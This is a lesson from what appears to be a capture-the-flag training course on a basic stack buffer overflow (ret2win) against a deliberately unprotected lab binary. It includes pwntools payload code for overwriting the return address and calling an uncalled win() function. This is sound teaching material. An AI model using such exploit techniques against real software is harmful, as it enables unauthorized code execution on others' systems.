# Day 6: Pwn / Binary Exploitation

## What Today Is

The flagship day. You redirect a program's execution for the first time. You'll overflow a buffer, overwrite a return address, and make the program call a function it was never supposed to call. This is what "getting code execution" means.

## Core Concepts

### Why C Is Memory-Unsafe

C arrays and buffers have no built-in bounds checking. If you write past the end of a buffer, C won't stop you. It silently overwrites whatever comes next in memory.

### Stack Smashing

Remember Day 2: the **return address** sits on the stack, right after your local variables. If a buffer on the stack has no bounds check (like `gets()`), you can write past it, keep writing through the saved base pointer, and overwrite the return address with an address you choose.

When the function returns, `ret` pops your chosen address instead of the real one, and the program jumps wherever you pointed it.

### What Modern Systems Do About This

Real systems have defenses:
- **Stack canaries**: a random value between the buffer and the return address; if it's changed, the program aborts
- **ASLR**: randomizes memory layout so you can't predict addresses
- **NX (No-Execute)**: marks the stack as non-executable so you can't run code placed there

For this exercise, all three are deliberately disabled so you can see the raw mechanism. Bypassing these protections is real, but it's post-week-one material.

## The Challenge: ret2win

You'll be given a binary called `overflow1`. It has:
- A `vuln()` function with an unsafe `gets()` call on a 64-byte buffer
- A `win()` function that prints the flag, but nothing in the program ever calls it

Your job: make the program call `win()`.

### Step-by-Step

1. **Find the buffer size and offset to the return address:**
   ```bash
   python3 -c "print('A' * 80)" | ./overflow1
   ```
   Increase the count until it segfaults. The segfault means you've overwritten the return address.

   For the exact offset, use a cyclic (De Bruijn) pattern with pwntools:
   ```python
   from pwn import *
   print(cyclic(100).decode())
   ```
   Feed it to the binary, note the crash address, then:
   ```python
   cyclic_find(0x<crash_value>)
   ```

2. **Find the address of `win()`:**
   ```bash
   objdump -d overflow1 | grep win
   ```

3. **Build the payload:**
   ```python
   from pwn import *
   
   offset = ??           # number of bytes to reach the return address
   win_addr = 0x??????   # address of win() from objdump
   
   payload = b'A' * offset + p64(win_addr)
   
   p = process('./overflow1')
   p.sendline(payload)
   print(p.recvall().decode())
   ```

4. **Run it.** If the offset and address are right, you'll see the flag.

### If Your Offset Doesn't Match Others

Offsets are compiler-version and OS-version dependent. If your number differs from someone else's, that's normal. Re-derive it on your own machine using the cyclic pattern method above.

## Mini-Challenge

Submit the flag from `overflow1` on the CTFd scoreboard.

## Hints

Stuck? Ask in Discord. Hints will be released progressively:
1. Think about what `gets()` doesn't check
2. The return address is a fixed number of bytes past the start of the buffer. Find that number
3. Once you control the return address, point it at `win()`

## Resources

- [pwn.college](https://pwn.college/): "Program Misuse" module for more after this
- LiveOverflow, "Binary Exploitation" playlist
- RPISEC "Modern Binary Exploitation" course notes
